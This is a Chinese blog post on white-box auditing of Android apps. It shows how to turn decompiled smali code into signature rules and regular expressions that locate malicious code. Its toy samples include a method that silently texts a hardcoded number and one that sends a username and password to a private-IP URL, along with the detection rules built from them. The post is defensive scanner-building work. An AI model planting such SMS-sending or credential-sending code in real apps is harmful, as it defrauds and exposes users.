<!DOCTYPE html><html lang="zh-CN"><head><meta name="generator" content="Hexo 3.8.0"><meta http-equiv="content-type" content="text/html; charset=utf-8"><meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport"><meta content="yes" name="apple-mobile-web-app-capable"><meta content="black-translucent" name="apple-mobile-web-app-status-bar-style"><meta content="telephone=no" name="format-detection"><meta name="description" content="大道至简"><title>Android白盒审计之代码定位 | Zero</title><link rel="stylesheet" type="text/css" href="/css/style.css?v=0.0.0"><link rel="stylesheet" type="text/css" href="//cdn.bootcss.com/normalize/8.0.0/normalize.min.css"><link rel="stylesheet" type="text/css" href="//cdn.bootcss.com/pure/1.0.0/pure-min.css"><link rel="stylesheet" type="text/css" href="//cdn.bootcss.com/pure/1.0.0/grids-responsive-min.css"><link rel="stylesheet" href="//cdn.bootcss.com/font-awesome/4.7.0/css/font-awesome.min.css"><script type="text/javascript" src="//cdn.bootcss.com/jquery/3.3.1/jquery.min.js"></script><link rel="Shortcut Icon" type="image/x-icon" href="/favicon.ico"><link rel="apple-touch-icon" href="/apple-touch-icon.png"><link rel="apple-touch-icon-precomposed" href="/apple-touch-icon.png"></head><body><div class="body_container"><div id="header"><div class="site-name"><h1 class="hidden">Android白盒审计之代码定位</h1><a id="logo" href="/.">Zero</a><p class="description"></p></div><div id="nav-menu"><a class="current" href="/."><i class="fa fa-home"> 首页</i></a><a href="/archives/"><i class="fa fa-archive"> 归档</i></a><a href="/about/"><i class="fa fa-user"> 关于</i></a><a href="/atom.xml"><i class="fa fa-rss"> 订阅</i></a></div></div><div class="pure-g" id="layout"><div class="pure-u-1 pure-u-md-3-4"><div class="content_container"><div class="post"><h1 class="post-title">Android白盒审计之代码定位</h1><div class="post-meta">Oct 23, 2018</div><div class="post-content"><p>标签（空格分隔）： AndroidSec</p>
<hr>
<h2 id="0x01-漏洞-恶意代码-规则提取"><a href="#0x01-漏洞-恶意代码-规则提取" class="headerlink" title="0x01 漏洞/恶意代码 规则提取"></a>0x01 漏洞/恶意代码 规则提取</h2><p>通常 <strong>安全测试人员/反病毒工程师</strong> 拿到的是<strong>apk包而非Java代码</strong>，这个时候就需要经过<strong>反编译dex拿到smali代码</strong>进行定位，为了定位，这个时候我们就需要用<strong>规则</strong>。</p>
<h3 id="1-smali代码规则"><a href="#1-smali代码规则" class="headerlink" title="1. smali代码规则"></a>1. smali代码规则</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">类似发送短信的恶意代码如下：</span><br><span class="line">public void sendSMS(String phoneNumber,String message)&#123;</span><br><span class="line">        //获取短信管理器</span><br><span class="line">        android.telephony.SmsManager smsManager = android.telephony.SmsManager.getDefault();</span><br><span class="line">        smsManager.sendTextMessage(&quot;18935353211&quot;, null, &quot;i am hacker&quot;, null, null);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>最终发送短信的代码为<strong>smsManager.sendTextMessage(“18935353211”, null, text, null, null)</strong>，因为我们拿到的是apk，最终拿到的是smali代码，那么我们需要提取smali规则，这个时候我们就需要用到一款<strong>Java2smali的AndroidStudio插件</strong>，直接将<strong>Java代码转化为smali代码</strong>，类似上段恶意代码的smali代码如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">.method public sendSMS(Ljava/lang/String;Ljava/lang/String;)V</span><br><span class="line">    .registers 9</span><br><span class="line">    .param p1, &quot;phoneNumber&quot;    # Ljava/lang/String;</span><br><span class="line">    .param p2, &quot;message&quot;    # Ljava/lang/String;</span><br><span class="line"></span><br><span class="line">    .prologue</span><br><span class="line">    const/4 v2, 0x0</span><br><span class="line"></span><br><span class="line">    .line 30</span><br><span class="line">    invoke-static &#123;&#125;, Landroid/telephony/SmsManager;-&gt;getDefault()Landroid/telephony/SmsManager;</span><br><span class="line"></span><br><span class="line">    move-result-object v0</span><br><span class="line"></span><br><span class="line">    .line 31</span><br><span class="line">    .local v0, &quot;smsManager&quot;:Landroid/telephony/SmsManager;</span><br><span class="line">    const-string v1, &quot;18935353211&quot;</span><br><span class="line"></span><br><span class="line">    const-string v3, &quot;i am hacker&quot;</span><br><span class="line"></span><br><span class="line">    move-object v4, v2</span><br><span class="line"></span><br><span class="line">    move-object v5, v2</span><br><span class="line"></span><br><span class="line">    invoke-virtual/range &#123;v0 .. v5&#125;, Landroid/telephony/SmsManager;-&gt;sendTextMessage(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Landroid/app/PendingIntent;Landroid/app/PendingIntent;)V</span><br><span class="line"></span><br><span class="line">    .line 33</span><br><span class="line">    return-void</span><br><span class="line">.end method</span><br></pre></td></tr></table></figure></p>
<p>这个时候可以轻而易举的提取到发送短信的规则</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">**Landroid/telephony/SmsManager;-&gt;sendTextMessage(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Landroid/app/PendingIntent;Landroid/app/PendingIntent;)V**</span><br></pre></td></tr></table></figure>
<p>然后根据这个规则就能定位到这行恶意代码为24行，同时根据47行的恶意代码就能拿到存放手机号和恶意短信的<strong>寄存器</strong>，类似这个存放手机号和短信的寄存器分别是<strong>v1和v3</strong>，然后利用寄存器构建后置规则，<strong>const-string v1</strong> 和 <strong>const-string v3</strong>,然后用后置规则向上回溯，精确定位到18(<strong>const-string v1, “18935353211”</strong>)和16行(<strong>const-string v3, “i am hacker”</strong>),这个时候就可以拿到恶意短信信息和手机号，然后可以通过这个smali文件定位到类名，最后拿到恶意代码类、恶意代码行和恶意代码，同理，可以根据这个扫描漏洞（只需替换为漏洞规则,并设置权重，最后计算权重），这对甲方进行安全风险评估很重要。</p>
<blockquote>
<p>详细情况如图：</p>
</blockquote>
<p><img src="https://i.screenshot.net/q5dqwad" alt="代码定位"></p>
<h3 id="2-正则规则"><a href="#2-正则规则" class="headerlink" title="2. 正则规则"></a>2. 正则规则</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">类似我们要定位出恶意的URL(&quot;http://172.16.168.111:1010/login.php&quot;)，如下代码：</span><br><span class="line">public static String loginByGet(String username,String password)&#123;</span><br><span class="line">        //get的方式提交就是url拼接的方式</span><br><span class="line">        String path = &quot;http://172.16.168.111:1010/login.php?username=&quot;+username+&quot;&amp;password=&quot;+password;</span><br><span class="line">        try &#123;</span><br><span class="line">            URL url = new URL(path);</span><br><span class="line">            HttpURLConnection connection = (HttpURLConnection) url.openConnection();</span><br><span class="line">            connection.setConnectTimeout(5000);</span><br><span class="line">            connection.setRequestMethod(&quot;GET&quot;);</span><br><span class="line">            //获得结果码</span><br><span class="line">            int responseCode = connection.getResponseCode();</span><br><span class="line">            if(responseCode ==200)&#123;</span><br><span class="line">                //请求成功 获得返回的流</span><br><span class="line">                InputStream is = connection.getInputStream();</span><br><span class="line">                return null;</span><br><span class="line">            &#125;else &#123;</span><br><span class="line">                //请求失败</span><br><span class="line">                return null;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; catch (MalformedURLException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; catch (ProtocolException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; catch (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        return null;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">上面代码的smali代码如下：</span><br><span class="line">.method public static loginByGet(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;</span><br><span class="line">    .registers 11</span><br><span class="line">    .param p0, &quot;username&quot;    # Ljava/lang/String;</span><br><span class="line">    .param p1, &quot;password&quot;    # Ljava/lang/String;</span><br><span class="line"></span><br><span class="line">    .prologue</span><br><span class="line">    const/4 v8, 0x0</span><br><span class="line"></span><br><span class="line">    .line 54</span><br><span class="line">    new-instance v6, Ljava/lang/StringBuilder;</span><br><span class="line"></span><br><span class="line">    invoke-direct &#123;v6&#125;, Ljava/lang/StringBuilder;-&gt;&lt;init&gt;()V</span><br><span class="line"></span><br><span class="line">    const-string v7, &quot;http://172.16.168.111:1010/login.php?username=&quot;</span><br><span class="line"></span><br><span class="line">    invoke-virtual &#123;v6, v7&#125;, Ljava/lang/StringBuilder;-&gt;append(Ljava/lang/String;)Ljava/lang/StringBuilder;</span><br><span class="line"></span><br><span class="line">    move-result-object v6</span><br><span class="line"></span><br><span class="line">    invoke-virtual &#123;v6, p0&#125;, Ljava/lang/StringBuilder;-&gt;append(Ljava/lang/String;)Ljava/lang/StringBuilder;</span><br><span class="line"></span><br><span class="line">    move-result-object v6</span><br><span class="line"></span><br><span class="line">    const-string v7, &quot;&amp;password=&quot;</span><br><span class="line"></span><br><span class="line">    invoke-virtual &#123;v6, v7&#125;, Ljava/lang/StringBuilder;-&gt;append(Ljava/lang/String;)Ljava/lang/StringBuilder;</span><br><span class="line"></span><br><span class="line">    move-result-object v6</span><br><span class="line"></span><br><span class="line">    invoke-virtual &#123;v6, p1&#125;, Ljava/lang/StringBuilder;-&gt;append(Ljava/lang/String;)Ljava/lang/StringBuilder;</span><br><span class="line"></span><br><span class="line">    move-result-object v6</span><br><span class="line"></span><br><span class="line">    invoke-virtual &#123;v6&#125;, Ljava/lang/StringBuilder;-&gt;toString()Ljava/lang/String;</span><br><span class="line"></span><br><span class="line">    move-result-object v3</span><br><span class="line"></span><br><span class="line">    .line 56</span><br><span class="line">    .local v3, &quot;path&quot;:Ljava/lang/String;</span><br><span class="line">    :try_start_1e</span><br><span class="line">    new-instance v5, Ljava/net/URL;</span><br><span class="line"></span><br><span class="line">    invoke-direct &#123;v5, v3&#125;, Ljava/net/URL;-&gt;&lt;init&gt;(Ljava/lang/String;)V</span><br><span class="line"></span><br><span class="line">    .line 57</span><br><span class="line">    .local v5, &quot;url&quot;:Ljava/net/URL;</span><br><span class="line">    invoke-virtual &#123;v5&#125;, Ljava/net/URL;-&gt;openConnection()Ljava/net/URLConnection;</span><br><span class="line"></span><br><span class="line">   =============================省略无用的=====================================</span><br><span class="line">.end method</span><br></pre></td></tr></table></figure>
<p>打开url的代码是: <strong>URL url = new URL(path)</strong>,即最终的smali规则会是<strong>Ljava/net/URL;-&gt;<init>(Ljava/lang/String;)V</init></strong>，这个时候你可以拿到存放url的寄存器为<strong>v3</strong>，代码行数是<strong>40</strong>行，但是因为url是经过拼接的，这个时候寄存器定位会出现问题，so，我们需要<strong>正则表达式</strong>定位，我们的目标是<strong><a href="http://172.16.168.111:1010/login.php" target="_blank" rel="noopener">http://172.16.168.111:1010/login.php</a></strong>，那么写出这个正则表达式如下，定位出<strong>172.16.168.111</strong>这个ip，然后就跟可以定位出恶意url，这是另外一种定位方式，在Android自动化审计中，常常用到。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(25[0-5]|2[0-4][0-9]|1[0-9][0-9]|[1-9]?[0-9])\.(25[0-5]|2[0-4][0-9]|1[0-9][0-9]|[1-9]?[0-9])\.(25[0-5]|2[0-4][0-9]|1[0-9][0-9]|[1-9]?[0-9])\.(25[0-5]|2[0-4][0-9]|1[0-9][0-9]|[1-9]?[0-9])</span><br></pre></td></tr></table></figure></p>
<p>逻辑图：<br><img src="https://i.screenshot.net/59x3ghm" alt="此处输入图片的描述"></p>
<h3 id="0x02-怎么提高审计效率"><a href="#0x02-怎么提高审计效率" class="headerlink" title="0x02 怎么提高审计效率"></a>0x02 怎么提高审计效率</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">多线程技术，将dex反编译后添加到扫描线程池</span><br></pre></td></tr></table></figure>
<p>逻辑图：<br><img src="https://i.screenshot.net/8zj98ap" alt="提高审计效率"></p>
<h3 id="0x03-规则提取时需要注意扫描后的误报率，即规则优化，后续"><a href="#0x03-规则提取时需要注意扫描后的误报率，即规则优化，后续" class="headerlink" title="0x03 规则提取时需要注意扫描后的误报率，即规则优化，后续"></a>0x03 规则提取时需要注意扫描后的误报率，即规则优化，后续</h3><h3 id="0x04-设置规则权重，进行安全评估，后续"><a href="#0x04-设置规则权重，进行安全评估，后续" class="headerlink" title="0x04 设置规则权重，进行安全评估，后续"></a>0x04 设置规则权重，进行安全评估，后续</h3></div><div class="tags"></div><div class="post-nav"><a class="pre" href="/2018/10/23/Man-in-the-Disk：通过公开的外部存储攻击Android应用程序/">Man-in-the-Disk：通过公开的外部存储攻击Android应用程序</a><a class="next" href="/2018/10/23/某APP/">某APP</a></div></div></div></div><div class="pure-u-1-4 hidden_mid_and_down"><div id="sidebar"><div class="widget"><form class="search-form" action="//www.google.com/search" method="get" accept-charset="utf-8" target="_blank"><input type="text" name="q" maxlength="20" placeholder="Search"><input type="hidden" name="sitesearch" value="http://yoursite.com"></form></div><div class="widget"><div class="widget-title"><i class="fa fa-folder-o"> 分类</i></div></div><div class="widget"><div class="widget-title"><i class="fa fa-star-o"> 标签</i></div><div class="tagcloud"></div></div><div class="widget"><div class="widget-title"><i class="fa fa-file-o"> 最近文章</i></div><ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2018/10/23/包盛斌/">包盛斌</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/10/23/以前的博客/">以前的博客</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/10/23/web安全攻击演示/">web安全攻击演示</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/10/23/狮鹫勒索者分析分析/">狮鹫勒索者分析分析</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/10/23/Android查壳/">Android查壳</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/10/23/Android malware analysis - fake Sagawa malware/">Android malware analysis - fake Sagawa malware</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/10/23/脚本病毒RANSOMWARE分析报告/">脚本病毒RANSOMWARE分析报告</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/10/23/类Unix平台的DDOS攻击样本分析/">类Unix平台的DDOS攻击样本分析</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/10/23/试着逆向一次windows PE文件/">试着逆向一次windows PE文件</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/10/23/Sql Injection 代码审计 2018-08-21/">Sql Injection 代码审计 2018-08-21</a></li></ul></div><div class="widget"><div class="widget-title"><i class="fa fa-external-link"> 友情链接</i></div><ul></ul><a href="http://www.example1.com/" title="site-name1" target="_blank">site-name1</a><ul></ul><a href="http://www.example2.com/" title="site-name2" target="_blank">site-name2</a><ul></ul><a href="http://www.example3.com/" title="site-name3" target="_blank">site-name3</a></div></div></div><div class="pure-u-1 pure-u-md-3-4"><div id="footer">Copyright © 2018 <a href="/." rel="nofollow">Zero.</a> Powered by<a rel="nofollow" target="_blank" href="https://hexo.io"> Hexo.</a><a rel="nofollow" target="_blank" href="https://github.com/tufu9441/maupassant-hexo"> Theme</a> by<a rel="nofollow" target="_blank" href="https://github.com/pagecho"> Cho.</a></div></div></div><a class="show" id="rocket" href="#top"></a><script type="text/javascript" src="/js/totop.js?v=0.0.0" async></script><script type="text/javascript" src="//cdn.bootcss.com/fancybox/3.3.5/jquery.fancybox.min.js" async></script><script type="text/javascript" src="/js/fancybox.js?v=0.0.0" async></script><link rel="stylesheet" type="text/css" href="//cdn.bootcss.com/fancybox/3.3.5/jquery.fancybox.min.css"><script type="text/javascript" src="/js/codeblock-resizer.js?v=0.0.0"></script><script type="text/javascript" src="/js/smartresize.js?v=0.0.0"></script></div></body></html>